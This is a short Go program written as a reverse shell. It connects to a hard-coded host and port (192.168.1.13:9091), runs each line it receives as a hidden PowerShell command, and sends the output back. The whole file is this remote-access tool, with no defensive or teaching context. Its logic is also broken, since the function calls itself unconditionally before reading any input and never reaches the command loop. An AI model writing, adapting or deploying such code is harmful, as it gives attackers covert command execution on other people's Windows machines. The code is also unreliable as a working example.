package main

import (
	"bufio"
	"net"
	"os/exec"
	"syscall"
)

func reverse(host string) {
	con, err := net.Dial("tcp", host)

	if err != nil {
		if nil != con {
			con.Close()
		}
	}

	//time.Sleep(1 * time.Minute)
	reverse(host)

	re := bufio.NewReader(con)

	for {
		cp, err := re.ReadString('\n')
		if err != nil {
			con.Close()
			reverse(host)
			return
		}
		cmd := exec.Command("powershell.exe", "/C", cp)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		salida, _ := cmd.CombinedOutput()
		con.Write(salida)
	}

}
func main() {
	reverse("192.168.1.13:9091")
}
